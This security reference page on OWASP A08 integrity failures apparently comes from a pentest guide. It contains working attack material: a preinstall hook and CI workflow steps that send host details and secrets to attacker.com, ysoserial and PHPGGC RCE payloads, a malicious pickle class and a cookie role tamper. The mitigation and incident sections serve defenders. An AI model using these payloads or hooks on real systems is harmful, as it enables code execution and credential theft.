---
title: Software & Data Integrity Failures
---

# Software & Data Integrity Failures

**(OWASP A08:2021 / A08:2025)**

Software and Data Integrity Failures occur when code, dependencies, CI/CD pipelines, or serialized data are consumed without verifying they are from a trusted, unmodified source. The application trusts inputs it should not, whether a third-party package, a CDN script, a software update, or a serialized object and executes them with full application privileges.

Covers: dependency confusion, typosquatting, insecure deserialization, CI/CD pipeline poisoning, unsigned updates, CDN/SRI failures.
Notable CWEs: CWE-502 (Deserialization of Untrusted Data), CWE-829 (Inclusion from Untrusted Control Sphere), CWE-494 (Download Without Integrity Check).

## Understanding the Basics

### The Trust Problem

Applications implicitly trust:

- Package registries resolving the correct version from the correct source
- Third-party CDN scripts serving unchanged content
- CI/CD pipelines running only authorized code
- Serialized objects arriving from clients containing only expected data
- Software updates being signed by the legitimate vendor

When any of these assumptions break, an attacker can execute arbitrary code at build time, deploy time, or runtime, often with no visible error to the user or developer.

### Serialization Fingerprints (Identification Quick Reference)

| Language / Format | Serialized Identifier |
| --- | --- |
| Java | `AC ED 00 05` (hex) / `rO0` (Base64) |
| PHP | `O:<length>:` e.g. `O:4:"User":` |
| Python pickle | `\x80\x04` (binary protocol byte) |
| .NET BinaryFormatter | `AAEAAAD` (Base64) |
| Ruby Marshal | `\x04\x08` |
| JSON (safe) | `{` / `[` — no gadget risk |

## Attack Surface

- **Package registries:** npm, PyPI, RubyGems, Maven resolving internal package names from public registries
- **CDN-hosted scripts:** `<script src="https://cdn.external.com/lib.js">` without SRI integrity hash
- **CI/CD pipelines:** GitHub Actions, Jenkins, GitLab CI pulling unverified external actions or artifacts
- **Auto-update mechanisms:** Firmware, desktop apps, or plugins updating without signature verification
- **Serialized session data:** Cookies, hidden form fields, API parameters carrying serialized objects
- **Cache layers:** Redis, Memcached storing pickled/serialized objects that users can influence
- **Message queues:** JMS, RabbitMQ, Kafka payloads deserialized by consumers without validation
- **ViewState / hidden fields:** .NET `__VIEWSTATE`, JSF state, custom base64-encoded state fields

## Exploiting Integrity Failures

### 1. Dependency Confusion

Package managers prefer the higher version number. Publish a public package with the same name as an internal private package at a higher version, the build system pulls the attacker's package automatically.

```bash
# Step 1 — Discover internal package names from public sources
# Check package.json / requirements.txt / pom.xml leaked in GitHub
grep -r "registry" package.json           # custom registry = internal packages
curl https://registry.npmjs.org/<pkg>     # 404 = unclaimed = vulnerable

# Step 2 — Publish malicious package with the same name at higher version
# package.json for attacker's payload (version 9999.0.0 wins over internal 1.2.3)
{
  "name": "internal-company-package",
  "version": "9999.0.0",
  "scripts": {
    "preinstall": "curl https://attacker.com/callback?host=$(hostname)&user=$(whoami)"
  }
}

# Step 3 — Victim's build system runs npm install → pulls attacker's package
# preinstall / postinstall hooks execute automatically on npm install
```

Python pip with `--extra-index-url` always installs the highest version across all indexes:

```bash
# If internal package exists at version 1.0 and attacker publishes 9999.0 to PyPI
pip install --extra-index-url https://internal.registry.com/simple internal-pkg
# pip resolves to PyPI version 9999.0 — attacker wins
```

### 2. Typosquatting

Publish a malicious package with a name one character off from a popular package — targeting developer typos or autocomplete mistakes.

```
Legitimate           Typosquatted
-----------          ------------
requests             requets / request / rquests
urllib3              urlib3 / urllib2
axios                axois / axois
lodash               lodahs / Lodash
django               djnago / Djanog
boto3                bot03 / bto3
```

```bash
# Confirm a typosquatted package is on PyPI
pip install requets   # Note the typo — actually published
# Package runs malicious code via setup.py / __init__.py on install

# Check if a package name is registered
curl -s https://registry.npmjs.org/requets | python3 -m json.tool | grep '"name"'
```

### 3. Insecure Deserialization — Java (ysoserial)

Java serialized objects beginning with `rO0` or `AC ED 00 05` passed in cookies, parameters, or headers are a direct RCE vector if the classpath contains a known gadget chain library.

```bash
# Step 1 — Identify Java serialization in traffic
# Look for rO0 in Base64 cookies or AC ED 00 05 in raw hex
echo "rO0ABXNyABFqYXZh..." | base64 -d | xxd | head
# AC ED 00 05 = Java serialized object confirmed

# Step 2 — Test with DNS callback (safe, out-of-band confirmation)
java -jar ysoserial.jar URLDNS "http://java-deser.YOUR.interactsh.com" | base64 -w0
# Inject into the vulnerable cookie/parameter
# DNS hit on interactsh = vulnerable classpath confirmed

# Step 3 — RCE via CommonsCollections gadget chain
java -jar ysoserial.jar CommonsCollections1 \
  "curl http://attacker.com/rce?h=$(hostname)" | base64 -w0
# Replace serialized value in request with generated payload

# Common gadget chains to try (in order of prevalence)
# CommonsCollections1-7, Spring1-2, Groovy1, JRMPClient, Jdk7u21
java -jar ysoserial.jar CommonsCollections5 "id" | base64 -w0
java -jar ysoserial.jar Spring1 "whoami" | base64 -w0
```

### 4. Insecure Deserialization — PHP (PHPGGC)

PHP `unserialize()` on user-controlled input enables object injection. `PHPGGC` generates gadget chain payloads for common frameworks.

```bash
# List available PHP gadget chains
phpggc -l

# Laravel RCE
phpggc Laravel/RCE1 system "id" -b
phpggc Laravel/RCE5 system "curl http://attacker.com/php" -b

# Symfony RCE
phpggc Symfony/RCE4 exec "curl http://attacker.com/sym" -b

# Inject into cookie
PAYLOAD=$(phpggc Laravel/RCE1 system "id" -b)
curl -s -b "session=$PAYLOAD" https://target.com/dashboard
```

PHP object manipulation (privilege escalation without full RCE):

```
Original cookie (Base64 decoded):
O:4:"User":2:{s:4:"name";s:5:"alice";s:4:"role";s:4:"user";}

Modified (change role value):
O:4:"User":2:{s:4:"name";s:5:"alice";s:4:"role";s:5:"admin";}

Re-encode to Base64 and submit — application grants admin role
```

### 5. Insecure Deserialization — Python Pickle

Python's `pickle` module executes arbitrary code on deserialization. Any endpoint loading user-supplied pickled data is RCE.

```python
import pickle, os, base64

# Craft a malicious pickle payload
class Exploit(object):
    def __reduce__(self):
        return (os.system, ("curl http://attacker.com/pickle?h=$(hostname)",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)   # Submit this as the session cookie or API parameter
```

```bash
# Identify pickle in HTTP traffic
# Base64 cookie starting with gASV or 80 04 (pickle protocol 4)
echo "gASV..." | base64 -d | python3 -c "import sys,pickle; pickle.loads(sys.stdin.buffer.read())"
```

### 6. CDN Hijack / Missing Subresource Integrity (SRI)

`<script>` tags loading external resources without an `integrity` hash execute whatever the CDN serves — including attacker-modified content.

```html
<!-- Vulnerable — no integrity check -->
<script src="https://cdn.polyfill.io/v2/polyfill.min.js"></script>

<!-- What to check for in target HTML source -->
<!-- If no integrity= attribute → vulnerable to CDN compromise -->
```

```bash
# Scan target page HTML for external scripts without SRI
curl -s https://target.com/ | grep -E '<script[^>]+src=' | grep -v 'integrity='
# Any result = CDN resource loaded without integrity verification

# Generate correct SRI hash for a file
curl -s https://cdn.example.com/lib.min.js | \
  openssl dgst -sha384 -binary | openssl base64 -A
# Compare against integrity= attribute value in source
```

### 7. CI/CD Pipeline Poisoning

Attacker with write access to a repository, workflow file, or referenced action injects malicious steps that execute during build — exfiltrating secrets or backdooring artifacts.

```yaml
# Malicious GitHub Actions step injected into .github/workflows/build.yml
- name: Build
  run: |
    curl -s https://attacker.com/exfil?token=${{ secrets.NPM_TOKEN }}
    curl -s https://attacker.com/exfil?aws=${{ secrets.AWS_ACCESS_KEY }}

# Mutable action reference (vulnerable — tag can be moved)
- uses: some-org/some-action@v1   # ← tag can point to attacker commit

# Pinned by commit SHA (safer)
- uses: some-org/some-action@a1b2c3d4e5f6  # ← immutable
```

```bash
# Audit GitHub Actions for unpinned / third-party action references
grep -r "uses:" .github/workflows/ | grep -v "@[a-f0-9]\{40\}"
# Any result using a tag (@v1, @main) instead of a full SHA = mutable reference
```

### 8. Unsigned / Unverified Update Mechanism

Application downloads and executes an update without verifying a digital signature — attacker who can MITM the update channel or compromise the update server delivers arbitrary code.

```bash
# Test if update endpoint serves over HTTP (unencrypted = trivial MITM)
curl -I http://target.com/update/latest.pkg

# Check if downloaded binary is signature-verified
# Absence of signature check in update logic:
# wget http://updates.target.com/app-v2.bin
# chmod +x app-v2.bin && ./app-v2.bin   ← no hash/signature check
```

### Test Cases

| Scenario | Action | Expected Outcome |
| --- | --- | --- |
| Dependency Confusion | Publish higher-version public package matching internal name | Build system pulls attacker package; preinstall hook executes |
| Typosquatting | Install misspelled package name | Malicious `setup.py` / preinstall hook runs |
| Java Deserialization | Submit `rO0`-prefixed cookie with URLDNS payload | DNS callback confirms gadget chain execution |
| PHP Object Injection | Modify serialized role field in cookie | Admin privilege granted without authentication |
| Python Pickle | Submit base64 pickle payload to session endpoint | RCE callback received |
| Missing SRI | Load page; check `<script src>` tags for `integrity=` | External scripts load without hash verification |
| CI/CD Secrets Exfil | Inject curl step into workflow via PR | Secrets exfiltrated to attacker-controlled endpoint |
| Unsigned Update | Intercept update download over HTTP | Replace binary with malicious payload |

## Detection Techniques (Offensive Perspective)

### Manual Detection — Identifying Integrity Failures

**Serialized Object Detection in Traffic**

```bash
# Intercept requests with Burp — look for these patterns in cookies/params/bodies:
# Java:   rO0 (Base64) or AC ED (hex)
# PHP:    O:<n>:"ClassName":  or a:<n>: (array)
# Python: gASV (Base64 pickle protocol 4) or 80 04 (binary)
# .NET:   AAEAAAD (Base64 BinaryFormatter)

# Decode and inspect a suspicious cookie
echo "rO0ABXNyABRq..." | base64 -d | strings | head -20
# Class names, library names in output → identify gadget chain candidates
```

**Missing SRI on External Resources**

```python
import sys, re
import urllib.request

url = "https://target.com/"
html = urllib.request.urlopen(url).read().decode("utf-8", errors="replace")

# Capture the full opening <script ...> tag (not just the src value)
script_tags = re.findall(r'(<script[^>]+src=["\'][^"\']+["\'][^>]*>)', html, re.IGNORECASE)

for tag in script_tags:
    src_match = re.search(r'src=["\']([^"\']+)["\']', tag, re.IGNORECASE)
    if not src_match:
        continue
    src = src_match.group(1)
    # Only flag external scripts (full URLs pointing off-domain)
    if src.startswith("http") and "target.com" not in src:
        if "integrity=" not in tag.lower():
            print(f"[NO SRI] {src}")
```

**Internal Package Name Discovery**

```bash
# Search GitHub for the target's package.json / requirements.txt / pom.xml
# Look for packages not found on public registries
npm view <package-name>    # E04 / 404 = not on npm = dependency confusion candidate
pip index versions <pkg>   # error = not on PyPI
```

### Automated Detection

```bash
# Scan for Java deserialization markers in all HTTP responses
# Run through Burp with Java Deserialization Scanner extension
# Or grep proxy logs:
grep -r "rO0AB" burp_logs/ | cut -d: -f1 | sort -u

# Retire.js — detect outdated/vulnerable JS libraries loaded from CDN
retire --js --outputformat json https://target.com

# Check all CDN script tags for missing SRI in bulk
gospider -s https://target.com -d 1 -q \
  | grep -oP 'src="https?://[^"]+"' \
  | while read src; do
      url=$(echo $src | grep -oP 'https?://[^"]+')
      echo "Checking: $url"
      curl -s https://target.com/ | grep -q "integrity=" || echo "[MISSING SRI] $url"
    done
```

```python
# Detect PHP serialized objects in parameter values
import requests, re

r = requests.get('https://target.com/')
cookies = r.cookies

for name, value in cookies.items():
    if re.match(r'^O:\d+:', value) or re.match(r'^a:\d+:', value):
        print(f'[PHP SERIALIZED] Cookie: {name} = {value[:60]}...')
    try:
        import base64
        decoded = base64.b64decode(value)
        if decoded[:2] == b'\xac\xed':
            print(f'[JAVA SERIALIZED] Cookie: {name}')
    except:
        pass
```

## Impact

- **RCE at Build Time:** Dependency confusion / typosquatting executes attacker code on developer machines and CI runners during `npm install` / `pip install`
- **RCE at Runtime:** Insecure deserialization of Java, PHP, or Python objects executes arbitrary OS commands on the application server
- **Supply Chain Cascade:** Compromised package or build artifact distributes malware to all downstream consumers (SolarWinds: 18,000 orgs; Polyfill.io: 380,000+ sites)
- **Secrets Exfiltration:** CI/CD pipeline poisoning leaks `AWS_SECRET`, `NPM_TOKEN`, `SSH_KEY` and other secrets to attacker infrastructure
- **Privilege Escalation:** Modifying serialized role/permission fields in cookies or hidden fields grants admin access without credentials
- **Persistent Backdoor:** Malicious update or poisoned build artifact installs persistent access across all user endpoints

## Tools

| Tool | Purpose |
| --- | --- |
| ysoserial | Java deserialization gadget chain payload generator |
| PHPGGC | PHP gadget chain generator for common frameworks |
| Burp Java Deserialization Scanner | Passive/active detection of Java serialization in HTTP traffic |
| Retire.js | Detect vulnerable/outdated JS libraries loaded from CDN |
| OWASP Dependency-Check | SCA — scan project dependencies for known CVEs |
| pip-audit / npm audit | Audit Python / Node.js dependencies for known vulnerabilities |
| Trivy | Container and filesystem vulnerability scanning including dependencies |
| interactsh / Burp Collaborator | Out-of-band callback for blind deserialization confirmation |
| gospider | Crawl and extract external resource URLs for SRI audit |

## Mitigation & Prevention

1. **Verify Serialized Data Integrity** — HMAC-sign serialized objects before sending to clients; verify the signature before deserializing — reject anything that fails
2. **Use Safe Serialization Formats** — Replace `pickle`, `unserialize()`, `ObjectInputStream` with JSON or other data-only formats that cannot execute code
3. **Implement Java Deserialization Filters** — Use `ObjectInputFilter` to allowlist only expected classes; deny all others
4. **Pin Dependencies with Lockfiles** — Commit `package-lock.json` / `requirements.txt` with exact hashes; use scoped package names (`@company/pkg`) to prevent confusion
5. **Use Private Registries with Priority** — Configure package managers to only resolve internal packages from internal registries; block public fallback for internal names
6. **Subresource Integrity (SRI)** — Add `integrity="sha384-<hash>"` to all external `<script>` and `<link>` tags; CSP `require-sri-for` enforces this at policy level
7. **Pin CI/CD Actions to Full Commit SHAs** — Never reference mutable tags (`@v1`, `@main`) in workflow files; pin to full 40-character commit SHA
8. **Sign and Verify Updates** — All software updates must be signed; clients verify signature before installation — reject unsigned or signature-invalid updates
9. **SBOM in CI/CD** — Generate a Software Bill of Materials (SBOM) per build using CycloneDX or SPDX; alert on new or changed dependencies

## Good To Read

### Notable Incidents

- **SolarWinds Orion (2020):** Attackers injected `SUNBURST` malware into the build pipeline — legitimate signed updates distributed to 18,000+ organizations including US government agencies
- **Polyfill.io (2024):** Domain sold to Funnull (China); malicious JS injected into 380,000+ sites embedding `cdn.polyfill.io` without SRI — redirected mobile users to scam sites (CVE-2024-38526)
- **Codecov Bash Uploader (2021):** Attackers modified the Codecov CI upload script to exfiltrate `CI_` environment variables — leaking credentials from thousands of CI pipelines
- **dependency-confusion (2021):** Alex Birsan published packages matching internal names of Apple, Microsoft, Tesla, Uber, Shopify — earning $130,000+ in bug bounties and demonstrating automated compromise of 35+ companies
- **3CX (2023):** Cascading supply chain attack — compromised Trading Technologies software infected a 3CX developer's machine, which then poisoned the 3CX desktop app build
- **XZ Utils (2024):** Two-year social engineering campaign added a backdoor to `liblzma` (CVE-2024-3094) — would have enabled SSH RCE on affected Linux distributions

### HackerOne Reports

- [Remote Code Execution via Java Deserialization (#1659202)](https://hackerone.com/reports/1659202)
- [Insecure Deserialization leading to RCE (#838196)](https://hackerone.com/reports/838196)
- [Dependency Confusion — Internal Package Hijack (#1504659)](https://hackerone.com/reports/1504659)
- [Unsafe Deserialization in Ruby on Rails (#1161427)](https://hackerone.com/reports/1161427)

## References

- [OWASP Top 10 A08:2021 — Software and Data Integrity Failures](https://owasp.org/Top10/2021/A08_2021-Software_and_Data_Integrity_Failures/)
- [OWASP Top 10 A08:2025 — Software or Data Integrity Failures](https://owasp.org/Top10/2025/A08_2025-Software_or_Data_Integrity_Failures/)
- [OWASP CICD-SEC-3: Dependency Chain Abuse](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-03-Dependency-Chain-Abuse)
- [OWASP Software Supply Chain Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Software_Supply_Chain_Security_Cheat_Sheet.html)
- [PortSwigger: Exploiting Insecure Deserialization](https://portswigger.net/web-security/deserialization/exploiting)
- [Alex Birsan: Dependency Confusion — How I Hacked into Apple, Microsoft and Dozens of Others](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
- [PayloadsAllTheThings: Insecure Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
- [MDN: Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Subresource_Integrity)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [CWE-829: Inclusion of Functionality from Untrusted Control Sphere](https://cwe.mitre.org/data/definitions/829.html)